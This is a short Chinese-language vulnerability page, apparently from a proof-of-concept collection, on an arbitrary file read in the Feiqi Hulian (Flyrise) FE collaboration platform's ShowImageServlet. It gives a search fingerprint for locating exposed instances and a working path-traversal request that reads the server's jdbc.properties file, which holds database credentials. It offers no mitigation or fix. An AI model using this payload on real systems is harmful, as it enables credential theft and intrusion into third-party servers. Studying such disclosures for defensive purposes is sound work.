# 飞企互联 FE业务协作平台 ShowImageServlet 任意文件读取漏洞

## 漏洞描述

飞企互联 FE业务协作平台 ShowImageServlet 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感文件

## 漏洞影响

<a-checkbox checked>飞企互联 FE业务协作平台 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>"flyrise.stopBackspace.js"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1691841203744-76e35241-156f-4393-b103-5a317c039d3e.png)

验证POC

```php
/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
```

![img](../../../.vuepress/public/img/1691841249185-93bab434-e137-495c-9ec8-48cb4de35486.png)